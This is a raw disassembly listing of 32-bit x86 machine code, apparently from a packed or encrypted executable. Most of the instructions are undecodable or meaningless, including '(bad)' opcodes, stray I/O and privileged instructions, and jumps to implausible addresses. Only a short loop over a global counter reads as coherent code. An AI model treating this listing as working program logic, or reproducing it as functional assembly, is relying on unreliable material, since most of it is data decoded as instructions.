  410f38:	mov    DWORD PTR ds:0x21e3f52d,esp
  410f3e:	daa    
  410f3f:	(bad)  
  410f40:	mov    ?,WORD PTR [edx-0x26530aad]
  410f46:	sahf   
  410f47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f48:	jae    0x410fa9
  410f4a:	mov    eax,ds:0x6161616b
  410f4f:	mov    ah,0x12
  410f51:	jge    0x410f41
  410f53:	add    eax,0xa8cdc5be
  410f58:	jns    0x410f57
  410f5a:	cli    
  410f5b:	ja     0x410f25
  410f5d:	lods   al,BYTE PTR ds:[esi]
  410f5e:	sub    al,0x0
  410f60:	xor    al,0x1d
  410f62:	test   eax,esp
  410f64:	xor    al,cl
  410f66:	imul   esp,DWORD PTR [esi],0xffffff8e
  410f69:	loop   0x410f65
  410f6b:	inc    ecx
  410f6c:	mov    cl,0x70
  410f6e:	pop    ebp
  410f6f:	scas   al,BYTE PTR es:[edi]
  410f70:	outs   dx,BYTE PTR ds:[esi]
  410f71:	push   0xc8498792
  410f76:	mov    al,0xd2
  410f78:	icebp  
  410f79:	xchg   esp,eax
  410f7a:	popa   
  410f7b:	fidivr WORD PTR [ecx+0x6b]
  410f7e:	dec    ebp
  410f7f:	or     al,0x24
  410f81:	xor    ecx,DWORD PTR ds:0x40665eeb
  410f87:	loop   0x410f5c
  410f89:	das    
  410f8a:	repz pop ecx
  410f8c:	cld    
  410f8d:	fdiv   QWORD PTR [eax]
  410f8f:	int3   
  410f90:	sbb    al,0xf4
  410f92:	jnp    0x410f6b
  410f94:	xchg   esp,eax
  410f95:	push   es
  410f96:	or     ebp,DWORD PTR [ebp+0x41b22ca1]
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fdee,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e19c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x53c29603]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410f97
  410fdd:	shr    DWORD PTR [ebp+0x61],cl
  410fe0:	nop
  410fe1:	xchg   esp,eax
  410fe2:	aad    0x4a
  410fe4:	test   al,0x54
  410fe6:	sysret 
  410fe8:	cdq    
  410fe9:	pop    es
  410fea:	add    dl,al
  410fec:	push   edi
  410fed:	mov    esp,0x768f5937
  410ff2:	adc    ch,ah
  410ff4:	outs   dx,BYTE PTR ds:[esi]
  410ff5:	adc    al,ah
  410ff7:	sbb    ecx,DWORD PTR [esi+0x4c3c03f1]
  410ffd:	push   eax
  410ffe:	fisub  DWORD PTR [edx]
  411000:	xchg   ecx,eax
  411001:	pop    ds
  411002:	xchg   edx,eax
  411003:	shl    ecx,cl
  411005:	scas   eax,DWORD PTR es:[edi]
  411006:	gs push 0x29
  411009:	nop
  41100a:	dec    esp
  41100b:	call   0xcc6b9ca9
  411010:	aaa    
  411011:	out    dx,al
  411012:	retf   0xb166
  411015:	cli    
  411016:	in     al,0x6e
  411018:	cmp    eax,esi
  41101a:	cs icebp 
  41101c:	xlat   BYTE PTR ds:[ebx]
  41101d:	icebp  
  41101e:	add    al,0xcb
  411020:	xchg   ecx,eax
  411021:	or     al,0x1c
  411023:	adc    al,0x88
  411025:	and    eax,DWORD PTR [eax]
  411027:	add    ch,ah
  411029:	mov    ds:0x1e223b56,eax
  41102e:	leave  
  41102f:	aam    0xcc
  411031:	push   ebp
  411032:	cmp    BYTE PTR [edi-0x66],0x7f
  411036:	(bad)  
  411037:	rep stos BYTE PTR es:[edi],al
  411039:	retf   
  41103a:	pop    esp
  41103b:	mov    edx,0x540014b5
  411040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411041:	mov    BYTE PTR [edx+0x44837e32],cl
  411047:	xchg   ebp,ebx
  411049:	ror    BYTE PTR [ecx],0x59
  41104c:	push   ebp
  41104d:	add    ah,BYTE PTR [edx-0x4c]
  411050:	shr    BYTE PTR [esi-0x5db84b93],cl
  411056:	mov    ecx,0x1bca42ea
  41105b:	dec    ecx
  41105c:	pop    es
  41105d:	outs   dx,DWORD PTR ds:[esi]
  41105e:	hlt    
  41105f:	cmp    cl,cl
  411061:	push   edx
  411062:	sbb    DWORD PTR [eax],0x1b
  411065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411066:	inc    eax
  411067:	mov    ecx,DWORD PTR [eax-0x511bc893]
  41106d:	ret    
  41106e:	adc    DWORD PTR [esi+edi*8],eax
  411071:	sub    dl,BYTE PTR [ebx+eiz*8]
  411074:	push   0x99b7c833
  411079:	jmp    0x411024
  41107b:	ins    BYTE PTR es:[edi],dx
  41107c:	cmp    BYTE PTR [ebx],ch
  41107e:	out    0x98,eax
  411080:	cmp    cl,BYTE PTR [ebp+0x12960759]
  411086:	iret   
  411087:	outs   dx,DWORD PTR ds:[esi]
  411088:	icebp  
  411089:	dec    ebx
  41108a:	fnsave [ecx-0x4d]
  41108d:	push   ss
  41108e:	jmp    0x5fa1fa5b
  411093:	inc    ecx
  411094:	int    0x89
  411096:	xchg   ecx,eax
  411097:	push   0xffffffd2
  411099:	adc    DWORD PTR [esi],ebp
  41109b:	lods   al,BYTE PTR ds:[esi]
  41109c:	xchg   ebp,eax
  41109d:	inc    esp
  41109e:	pop    ss
  41109f:	xchg   edx,eax
  4110a0:	int3   
  4110a1:	test   eax,0xc5a72ca8
  4110a6:	stc    
  4110a7:	loope  0x411066
  4110a9:	mov    dh,0xf5
  4110ab:	fld    QWORD PTR [ecx-0x4]
  4110ae:	lock sti 
  4110b0:	leave  
  4110b1:	dec    esp
  4110b2:	sahf   
  4110b3:	out    0x32,eax
  4110b5:	sar    BYTE PTR [esp+esi*4],0xdd
  4110b9:	and    bh,0x7d
  4110bc:	jae    0x41104a
  4110be:	mov    eax,ds:0xcd8d4cf2
  4110c3:	jmp    0x73ad:0x3fb0f0b3
  4110ca:	push   ebp
  4110cb:	or     esp,DWORD PTR [ebp+0x64]
  4110ce:	into   
  4110cf:	je     0x411077
  4110d1:	or     BYTE PTR [edi],bl
  4110d3:	lods   eax,DWORD PTR ds:[esi]
  4110d4:	test   eax,0xade660b9
  4110d9:	ja     0x411148
  4110db:	mov    cs,WORD PTR [eax-0x457de5bd]
  4110e1:	or     DWORD PTR [ecx+eiz*8+0x1d175336],0xc
  4110e9:	add    DWORD PTR [edi],edx
  4110eb:	not    BYTE PTR [edx+0x41c2901c]
  4110f1:	repz mov al,0xf5
  4110f4:	mov    ?,WORD PTR [ecx]
  4110f6:	imul   esp,DWORD PTR [edx-0x57],0x3d
  4110fa:	cmp    al,bl
  4110fc:	cli    
  4110fd:	adc    ebp,DWORD PTR [ebx-0x6c]
  411100:	pop    ebp
  411102:	sub    dh,ah
  411104:	and    DWORD PTR [edi+0x3f],0xffffffa4
  411108:	data16 sbb BYTE PTR [edx+0x19],0xa4
  41110d:	push   esp
  41110e:	ret    0xfb1f
  411111:	pop    esi
  411112:	inc    eax
  411113:	or     eax,0xbaec6748
  411118:	inc    ebx
  411119:	or     bh,BYTE PTR [ebx-0x43]
  41111c:	cli    
  41111d:	sub    esp,DWORD PTR [ebx+0x5f3918b6]
  411123:	add    eax,0x79edbb2f
  411128:	out    0xe8,al
  41112a:	add    DWORD PTR [ecx+0x175a4ef0],esp
  411130:	sbb    DWORD PTR [esi],ebx
  411132:	sbb    dh,0x8d
  411135:	mov    ebp,eax
  411137:	imul   esp,DWORD PTR [esi+ebx*8+0x5de0ed2c],0x49
  41113f:	push   eax
  411140:	inc    esp
  411141:	sahf   
  411142:	cmc    
  411143:	bound  ebx,QWORD PTR [eax]
  411145:	clc    
  411146:	mul    edx
  411148:	push   eax
  411149:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41114b:	mov    ecx,0x6dcd7a6a
  411150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411151:	ficomp WORD PTR [edx+0x5c6cc345]
  411157:	(bad)  
  411158:	adc    ch,dl
  41115a:	mov    cl,0x7a
  41115c:	sbb    dl,cl
  41115e:	lds    eax,FWORD PTR [ebx-0x22]
  411161:	xchg   esp,eax
  411162:	adc    eax,0x2b293933
  411167:	mov    ds:0xfe3258e1,al
  41116c:	leave  
  41116d:	inc    esi
  41116e:	(bad)  
  41116f:	not    bl
  411171:	pop    ds
  411172:	fld    TBYTE PTR [ebp+0x7]
  411175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411176:	sub    eax,0xdfad3a82
  41117b:	pop    ds
  41117c:	iret   
  41117d:	fstp   TBYTE PTR [edi+0x62ba7193]
  411183:	push   0xffffff8e
  411185:	mov    ebp,0xd4acf499
  41118a:	jg     0x411196
  41118c:	dec    edi
  41118d:	push   eax
  41118e:	aaa    
  41118f:	ret    0x53b
  411192:	cld    
  411193:	jmp    0x41117e
  411195:	dec    edx
  411196:	dec    ebp
  411197:	dec    esi
  411198:	retf   
  411199:	ret    0x8a35
  41119c:	pop    ecx
  41119d:	pop    eax
  41119e:	mov    bl,0x62
  4111a0:	icebp  
  4111a1:	sar    ebp,0x1d
  4111a4:	shl    esi,0x41
  4111a7:	fsubr  st,st(3)
  4111a9:	push   ecx
  4111aa:	mov    cl,0xba
  4111ac:	or     al,0xb8
  4111ae:	push   es
  4111af:	ins    DWORD PTR es:[edi],dx
  4111b0:	sbb    ebx,DWORD PTR [edi+edx*4]
  4111b3:	gs call 0x512fd14d
  4111b9:	out    dx,al
  4111ba:	mov    cl,0x2a
  4111bc:	sbb    al,0x4d
  4111be:	fild   QWORD PTR [edi+0x49]
  4111c1:	mov    ebp,0x8d3e89df
  4111c6:	rcl    DWORD PTR [eax-0x75949fbc],0x98
  4111cd:	and    BYTE PTR [eax-0x24dbaa11],ch
  4111d3:	mov    ebp,0x710e84c5
  4111d8:	(bad)  
  4111d9:	lods   al,BYTE PTR ds:[esi]
  4111da:	leave  
  4111db:	xor    al,0x67
  4111dd:	inc    edi
  4111de:	sub    dl,BYTE PTR [ecx+0x7ec57d3d]
  4111e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111e5:	mov    ch,0xe8
  4111e7:	mov    ebx,0x1a086b2b
  4111ec:	xchg   ebx,eax
  4111ed:	mov    bl,0x5d
  4111ef:	xor    bl,dh
  4111f1:	shr    DWORD PTR [esi+0x4],0xa2
  4111f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111f6:	sbb    eax,0xe52f689a
  4111fb:	lods   eax,DWORD PTR ds:[esi]
  4111fc:	or     BYTE PTR [eax+0x70d2053e],al
  411202:	mov    ch,0x30
  411204:	ret    
  411205:	pop    edi
  411206:	fisub  WORD PTR [ebx+0x63]
  411209:	jmp    0x9ec16251
  41120e:	cdq    
  41120f:	adc    BYTE PTR [esi-0x24],ch
  411212:	pop    edi
  411213:	arpl   WORD PTR [edi-0x27],cx
  411216:	in     al,0x3b
  411218:	and    al,0xf1
  41121a:	inc    edi
  41121b:	aas    
  41121c:	and    eax,0x87b2b63f
  411221:	(bad)  
  411222:	int    0x17
  411224:	inc    esi
  411225:	mov    edi,0x5b40b734
  41122a:	repnz sbb cl,0x34
  41122e:	xlat   BYTE PTR ds:[ebx]
  41122f:	fsub   DWORD PTR [edx-0x2b]
  411232:	inc    edi
  411233:	fmul   QWORD PTR [ebx-0x2a]
  411236:	or     eax,DWORD PTR [eax]
  411238:	or     eax,0xa5b84a6b
  41123d:	mov    ?,WORD PTR [ebx-0x6ca9f357]
  411243:	xor    BYTE PTR ds:0xfb97a3ba,ah
  411249:	cwde   
  41124a:	xchg   esi,eax
  41124b:	test   DWORD PTR [ecx-0x7a],0x27aa5f3f
  411252:	mov    dh,0x63
  411254:	fld    DWORD PTR [edi+esi*1]
  411257:	push   0xc97d30f1
  41125c:	inc    esi
  41125d:	xchg   ebp,eax
  41125e:	std    
  41125f:	push   esi
  411260:	or     BYTE PTR [ebp+0x61aaf326],0x81
  411267:	pop    eax
  411268:	mov    esi,0x77d2a39b
  41126d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41126e:	add    DWORD PTR [ecx-0x1305c826],0xffffff9b
  411275:	nop
  411276:	jne    0x4112eb
  411278:	and    eax,edx
  41127a:	popa   
  41127b:	push   0x56
  41127d:	mov    edx,0xc14c6eda
  411282:	shl    esp,1
  411284:	lods   eax,DWORD PTR ds:[esi]
  411285:	jp     0x41127f
  411287:	xlat   BYTE PTR ds:[ebx]
  411288:	ror    bh,0x8c
  41128b:	in     al,dx
  41128c:	stos   BYTE PTR es:[edi],al
  41128d:	mov    al,ds:0x7e867bb7
  411292:	push   0xc5f96ce9
  411297:	sbb    esp,edx
  411299:	lahf   
  41129a:	pushf  
  41129b:	xchg   edx,eax
  41129c:	cmp    al,0xb9
  41129e:	(bad)  
  41129f:	daa    
  4112a0:	cli    
  4112a1:	in     eax,0x3d
  4112a3:	mov    edx,0x18350882
  4112a8:	cld    
  4112a9:	ins    BYTE PTR es:[edi],dx
  4112aa:	retf   0xe9f3
  4112ad:	mov    ebx,0x303f1d45
  4112b2:	sub    BYTE PTR [esi-0x4bb177e4],cl
  4112b8:	xchg   BYTE PTR ds:0xc0885fb2,bh
  4112be:	aad    0x78
  4112c0:	and    DWORD PTR [ecx],ebp
  4112c2:	icebp  
  4112c3:	sbb    ah,dl
  4112c5:	mov    dh,0x35
  4112c7:	lods   eax,DWORD PTR ds:[esi]
  4112c8:	inc    ecx
  4112c9:	lahf   
  4112ca:	imul   ebx,DWORD PTR [edi-0x387555be],0x95099d0
  4112d4:	cmp    dh,0xee
  4112d7:	(bad)  
  4112d8:	pop    es
  4112d9:	lock push esi
  4112db:	add    ch,BYTE PTR ds:0xc82946a8
  4112e1:	vpaddsw ymm7,ymm4,YMMWORD PTR [eax-0x515094c1]
  4112e9:	cmp    dl,BYTE PTR [ebx-0x730fe34]
  4112ef:	loop   0x411361
  4112f1:	in     al,dx
  4112f2:	retf   
  4112f3:	dec    ebx
  4112f4:	gs mov ecx,0x5d3972c
  4112fa:	adc    cl,dh
  4112fc:	ror    BYTE PTR [edi-0x50fc5bfc],1
  411302:	fisubr WORD PTR [ebp-0x554c7522]
  411308:	push   es
  411309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41130a:	in     eax,dx
  41130b:	jbe    0x411357
  41130d:	push   esp
  41130e:	fnstsw WORD PTR [edi+0x14]
  411311:	imul   ebx,edx,0xffffffbe
  411314:	test   al,0x63
  411316:	call   0x88d2d258
  41131b:	adc    bl,BYTE PTR [edi]
  41131d:	add    dh,BYTE PTR [edi]
  41131f:	pop    ebx
  411320:	(bad)  
  411322:	cmp    eax,0x146526e7
  411327:	out    dx,eax
  411328:	sbb    DWORD PTR [eax],0x18a80c23
  41132e:	push   es
  41132f:	les    esi,FWORD PTR ds:0x39b6bffa
  411335:	and    al,0x9a
  411337:	loopne 0x411321
  411339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41133a:	cmp    al,0xe1
  41133c:	adc    DWORD PTR [edx-0x5f6cdc86],ebp
  411342:	inc    ebp
  411343:	pusha  
  411344:	jmp    0x41130a
  411346:	xor    al,0x65
  411348:	test   eax,0xb6a60ea8
  41134d:	(bad)  
  41134e:	mov    ah,0x28
  411350:	or     DWORD PTR [ebp-0x57],edx
  411353:	repnz or ch,bh
  411356:	pop    ecx
  411357:	sahf   
  411358:	(bad)  
  411359:	dec    esp
  41135a:	mov    ecx,0x85332802
  41135f:	push   eax
  411360:	mov    dx,0x69a3
  411364:	es inc esi
  411366:	cmp    eax,0xe5e6a6c2
  41136b:	enter  0x2404,0xc6
  41136f:	add    dl,BYTE PTR es:[edx+0xe62fb42]
  411376:	adc    eax,0xc8cf2818
  41137b:	xchg   esp,eax
  41137c:	add    al,0x4d
  41137e:	xor    eax,0x9722e276
  411383:	ror    DWORD PTR [edi-0x2],0x9c
  411387:	push   esp
  411388:	inc    ebx
  411389:	push   ebx
  41138a:	out    dx,al
  41138b:	test   dh,ah
  41138d:	push   ebp
  41138e:	nop
  41138f:	sub    BYTE PTR [ebx-0x4b],bl
  411392:	pop    ebp
  411393:	push   cs
  411394:	not    DWORD PTR [ecx-0x12]
  411397:	shl    DWORD PTR [edi+0x6e],1
  41139a:	les    ecx,FWORD PTR [ecx+0x0]
  41139d:	cli    
  41139e:	and    ebp,DWORD PTR [edi-0x35]
  4113a1:	push   ecx
  4113a2:	test   BYTE PTR [ebx],bl
  4113a4:	ror    DWORD PTR [esi],cl
  4113a6:	in     eax,dx
  4113a7:	mov    dl,0xdc
  4113a9:	or     ecx,DWORD PTR [ecx]
  4113ab:	fistp  WORD PTR [ecx]
  4113ad:	mov    WORD PTR [edi+0x1b],gs
  4113b0:	mov    eax,0xe9036383
  4113b5:	dec    ebx
  4113b6:	out    dx,al
  4113b7:	shl    BYTE PTR [edx],1
  4113b9:	add    eax,0xc51441da
  4113be:	test   al,0x83
  4113c0:	test   BYTE PTR [eax+0x7f],dl
  4113c3:	push   es
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fd71,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fdfa,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fdfa
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fdfa,esi
  4113f2:	cmp    DWORD PTR ds:0x42fdfa,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e267
  411404:	push   0x42e2ed
  411409:	call   DWORD PTR ds:0x42e5e7
  41140f:	cmp    DWORD PTR ds:0x42fdfa,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fdfa
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fdfa,esi
  411429:	cmp    DWORD PTR ds:0x42fdfa,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	sbb    edi,DWORD PTR [edx]
  411449:	xchg   ecx,eax
  41144a:	and    DWORD PTR [esi],ecx
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4113e5
  411454:	imul   esp,DWORD PTR [esp+eiz*8-0x52],0x6359a33f
  41145c:	into   
  41145d:	and    DWORD PTR [edx-0x317cdd6],esi
  411463:	mov    cl,BYTE PTR [edx-0x41fdcec3]
  411469:	sar    DWORD PTR [ecx],0x70
  41146c:	out    0x41,al
  41146e:	dec    ebx
  41146f:	inc    ebp
  411470:	sar    DWORD PTR [ebx+ecx*2+0x62],cl
  411474:	inc    esp
  411475:	(bad)  
  411476:	cmc    
  411477:	and    eax,0x748ecc2c
  41147c:	jns    0x411471
  41147e:	dec    ebx
  41147f:	jno    0x4114de
  411481:	mov    bl,0xc9
  411483:	iret   
  411484:	mov    eax,0x336009b2
  411489:	mov    bl,0x6d
  41148b:	(bad)  
  41148c:	jecxz  0x4114a5
  41148e:	outs   dx,DWORD PTR ds:[esi]
  41148f:	sbb    DWORD PTR [eax+0x36a23f63],0xe39f5de5
  411499:	push   ds
  41149a:	or     al,0xeb
  41149d:	push   es
  41149e:	sbb    eax,ecx
  4114a0:	cmp    bh,BYTE PTR [edx-0x42]
  4114a3:	cdq    
  4114a4:	mov    ecx,0x70d111c2
  4114a9:	pop    ebp
  4114aa:	pop    ebp
  4114ab:	fwait
  4114ac:	dec    ecx
  4114ad:	jno    0x411487
  4114af:	imul   edi,DWORD PTR [esp+edx*2+0x78],0xb229ba9d
  4114b7:	mov    eax,ds:0x9f832d83
  4114bc:	mov    ds:0x21316511,eax
  4114c1:	mov    dl,BYTE PTR [edi-0x52959f6d]
  4114c7:	inc    esi
  4114c8:	push   ds
  4114c9:	loope  0x411467
  4114cb:	pop    esi
  4114cc:	faddp  st(6),st
  4114ce:	aaa    
  4114cf:	lods   al,BYTE PTR ds:[esi]
  4114d0:	sub    edi,DWORD PTR [edx-0x2c054592]
  4114d6:	cmp    ch,BYTE PTR [eax+0xe]
  4114d9:	retf   
  4114da:	inc    esp
  4114db:	fild   QWORD PTR [eax-0x37]
  4114de:	outs   dx,BYTE PTR ds:[esi]
  4114df:	pushf  
  4114e0:	(bad)  
  4114e2:	mov    bl,0xa6
  4114e4:	or     edi,ebp
  4114e6:	xchg   esp,eax
  4114e7:	(bad)  
  4114e8:	rol    cl,1
  4114ea:	dec    eax
  4114eb:	cmp    eax,0x31b55418
  4114f0:	mov    WORD PTR [ebx-0x38],fs
  4114f3:	jl     0x411543
  4114f5:	inc    esi
  4114f6:	mov    cl,0x83
  4114f8:	iret   
  4114f9:	add    dh,BYTE PTR [edi]
  4114fb:	sub    al,0x4b
  4114fd:	mov    WORD PTR [edx-0x1007328d],?
  411503:	pop    es
  411504:	mov    es,WORD PTR [eax-0x1a]
  411507:	aam    0x6
  411509:	jmp    0x9a5d:0x2198b191
  411510:	(bad)  
  411511:	cmc    
  411512:	mov    dh,0xc1
  411514:	outs   dx,BYTE PTR ds:[esi]
  411515:	push   edx
  411516:	xor    edi,DWORD PTR [ecx]
  411518:	js     0x4114e6
  41151a:	add    ecx,DWORD PTR [ebp+0x28]
  41151d:	inc    edi
  41151e:	imul   eax,DWORD PTR [ebp+0x561e93dc],0x54
  411525:	and    DWORD PTR ds:0x3b06c9fd,0xffffffe3
  41152c:	xor    bl,BYTE PTR [ecx+0x2b072b45]
  411532:	dec    edx
  411533:	popa   
  411534:	and    ebx,ebx
  411536:	shr    BYTE PTR [ebx-0x6c8f154],1
  41153c:	dec    eax
  41153d:	dec    edi
  41153e:	sbb    DWORD PTR [eax],ebp
  411540:	adc    cl,BYTE PTR [esi+0x1a]
  411543:	or     dl,ah
  411545:	jecxz  0x4114e0
  411547:	mov    BYTE PTR [edi+0x2d],dl
  41154a:	xchg   BYTE PTR [edx+0x360bf37e],cl
  411550:	xor    BYTE PTR [esi+eax*8-0x663b04a6],bl
  411557:	fild   QWORD PTR [edi+0x70]
  41155a:	cdq    
  41155b:	mov    al,ds:0x8387da32
  411560:	xor    DWORD PTR [esp+ecx*4+0xfd208bf],eax
  411567:	ja     0x4115b4
  411569:	fxch   st(6)
  41156b:	cmp    al,0x88
  41156d:	rcr    BYTE PTR [ecx-0x1a],0x4
  411571:	std    
  411572:	pusha  
  411573:	pop    ds
  411574:	test   DWORD PTR ds:0xb5d52f4e,edx
  41157a:	scas   al,BYTE PTR es:[edi]
  41157b:	into   
  41157c:	(bad)  
  41157d:	push   edx
  41157e:	mov    ecx,0xfdae489
  411583:	je     0x411589
  411585:	fyl2x  
  411587:	push   eax
  411588:	inc    esp
  411589:	pop    esi
  41158a:	mov    al,ds:0xa01a7948
  41158f:	fbld   TBYTE PTR [esi+0x77e6b824]
  411595:	fdiv   QWORD PTR [eax+0x2]
  411598:	mov    ch,0x83
  41159a:	(bad)  
  41159b:	(bad)  
  41159d:	sub    eax,0x972166b3
  4115a2:	sub    eax,0x403d7d92
  4115a7:	add    al,0x9e
  4115a9:	sbb    eax,0xa2c751d
  4115ae:	pop    ebp
  4115af:	pop    eax
  4115b0:	inc    edi
  4115b1:	cmp    BYTE PTR [esi+0x48015e4a],ch
  4115b7:	jo     0x411579
  4115b9:	xchg   BYTE PTR [esi],bl
  4115bb:	ja     0x41154c
  4115bd:	cdq    
  4115be:	adc    DWORD PTR [ebp+0x16be1121],ebp
  4115c4:	push   ebx
  4115c5:	xor    dh,bh
  4115c7:	fxch   st(5)
  4115c9:	mov    ecx,0xe2b0bd9
  4115ce:	test   al,0x3c
  4115d0:	jmp    0xb97debd6
  4115d5:	repz add ah,BYTE PTR [eax]
  4115d8:	ror    BYTE PTR [edi+0x63e60d16],1
  4115de:	push   ebx
  4115df:	fiadd  DWORD PTR [eax+esi*2]
  4115e2:	jle    0x41160e
  4115e4:	pop    ss
  4115e5:	stos   DWORD PTR es:[edi],eax
  4115e6:	aam    0x4b
  4115e8:	popaw  
  4115ea:	and    al,0x46
  4115ec:	daa    
  4115ed:	call   0xdcd2:0x5afa663c
  4115f4:	push   cs
  4115f5:	adc    DWORD PTR [eax-0x64bfb7d5],ebx
  4115fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115fc:	add    al,0x77
  4115fe:	scas   eax,DWORD PTR es:[edi]
  4115ff:	xchg   ebx,eax
  411600:	xchg   esp,eax
  411601:	push   es
  411602:	xchg   edi,eax
  411603:	rcr    DWORD PTR [ecx-0x4705900d],0x69
  41160a:	mov    cs,ebp
  41160c:	adc    al,dl
  41160e:	jmp    0xefed66ae
  411613:	sub    BYTE PTR [esi-0x5c],0xb5
  411617:	dec    ebp
  411618:	mov    ebp,edx
  41161a:	dec    ebx
  41161b:	xchg   ebp,eax
  41161c:	xor    ebp,esp
  41161e:	gs push edx
  411620:	xchg   edi,eax
  411621:	pusha  
  411622:	mov    ebp,0x4e5748b5
  411627:	xchg   BYTE PTR [esi+0xc1f87cc],ch
  41162d:	lods   al,BYTE PTR ds:[esi]
  41162e:	sti    
  41162f:	out    0x48,al
  411631:	outs   dx,BYTE PTR ds:[esi]
  411632:	ret    
  411633:	fdivp  st(3),st
  411635:	add    ecx,DWORD PTR [edi]
  411637:	retf   0x1d4f
  41163a:	push   ebx
  41163b:	xchg   BYTE PTR [eax],ch
  41163d:	ss nop
  41163f:	sbb    al,BYTE PTR [edi+0x1b5406c4]
  411645:	dec    ebp
  411646:	jae    0x4115d8
  411648:	lods   eax,DWORD PTR ds:[esi]
  411649:	rol    DWORD PTR ds:0x1538d679,cl
  41164f:	inc    eax
  411650:	xor    ecx,DWORD PTR [esi-0x1]
  411653:	xchg   ebp,eax
  411654:	mov    ah,0x8e
  411656:	or     BYTE PTR [ebx+0x13],dl
  411659:	xchg   esi,eax
  41165a:	jmp    0xb3101307
  41165f:	mov    ebp,0xf3325ba5
  411664:	or     al,0x26
  411666:	xlat   BYTE PTR ds:[ebx]
  411667:	lock xchg edx,eax
  411669:	in     eax,dx
  41166a:	rcr    BYTE PTR [esi-0x21ed325f],1
  411670:	sub    BYTE PTR [edi-0x7a],0xd5
  411674:	lahf   
  411675:	mov    al,0x64
  411677:	mov    gs,WORD PTR [esp+edi*4]
  41167a:	fnsave [ecx+0x26]
  41167d:	push   ss
  41167e:	push   esp
  41167f:	jp     0x4116ac
  411681:	lock sbb al,0x9f
  411684:	ins    DWORD PTR es:[edi],dx
  411685:	mov    bh,0x95
  411687:	mov    WORD PTR [ecx],es
  411689:	push   ss
  41168a:	dec    DWORD PTR [edi+0x3c]
  41168d:	jns    0x4116c3
  41168f:	mov    WORD PTR [ebp+0x28],es
  411692:	test   al,0x41
  411694:	jo     0x411673
  411696:	mov    gs,WORD PTR [edx-0x3e]
  411699:	push   ebp
  41169a:	bound  ebp,QWORD PTR [ecx-0x37]
  41169d:	in     eax,dx
  41169e:	xchg   ecx,eax
  41169f:	push   ebp
  4116a0:	popf   
  4116a1:	lds    esi,FWORD PTR [ebx-0x2d7242b0]
  4116a7:	pop    esp
  4116a8:	xlat   BYTE PTR ds:[ebx]
  4116a9:	push   ss
  4116aa:	leave  
  4116ab:	fstp   DWORD PTR [edx+0x1ae23276]
  4116b1:	cmp    DWORD PTR fs:[edx+0x1c],ecx
  4116b5:	fwait
  4116b6:	adc    ebp,DWORD PTR [esi-0x73]
  4116b9:	scas   al,BYTE PTR es:[edi]
  4116ba:	fmul   st(6),st
  4116bc:	div    BYTE PTR [ebx-0x6d]
  4116bf:	mov    ?,WORD PTR [ebx-0x80]
  4116c2:	stos   BYTE PTR es:[edi],al
  4116c3:	leave  
  4116c4:	(bad)  
  4116c5:	jns    0x41170f
  4116c7:	dec    edi
  4116c8:	fist   WORD PTR [esi+esi*4]
  4116cb:	lock jne 0x4116ad
  4116ce:	out    0x87,eax
  4116d0:	mov    DWORD PTR [ebx+0x7a41fc5f],ebx
  4116d6:	scas   al,BYTE PTR es:[edi]
  4116d7:	icebp  
  4116d8:	clc    
  4116d9:	popa   
  4116da:	in     al,0xb5
  4116dc:	stc    
  4116dd:	push   ebp
  4116de:	out    dx,eax
  4116df:	mov    ch,0xad
  4116e1:	pop    ebp
  4116e2:	dec    eax
  4116e3:	or     DWORD PTR [ecx+edx*4],ebx
  4116e6:	fnstsw ax
  4116e8:	adc    ah,bh
  4116ea:	xchg   DWORD PTR ds:0xfbcda9d,ecx
  4116f0:	es ins BYTE PTR es:[edi],dx
  4116f2:	xor    BYTE PTR [esi-0x5a893edf],dl
  4116f8:	dec    edx
  4116f9:	mov    BYTE PTR ds:0xf378a02f,ch
  4116ff:	push   es
  411700:	imul   ebx,DWORD PTR [edi+0x7341e92f],0xffffffa7
  411707:	(bad)  
  411708:	cld    
  411709:	cmp    bl,BYTE PTR [ebx-0x6a830b21]
  41170f:	test   al,0x6d
  411711:	push   es
  411712:	aam    0x46
  411714:	push   edi
  411715:	out    dx,al
  411716:	imul   DWORD PTR [ebx+0x75]
  411719:	sub    DWORD PTR [edi],edi
  41171b:	pushf  
  41171c:	cld    
  41171d:	jne    0x411753
  41171f:	cld    
  411720:	into   
  411721:	cmp    BYTE PTR [ecx+eiz*1-0x22],cl
  411725:	sbb    eax,0xbcb6dd01
  41172a:	jae    0x411739
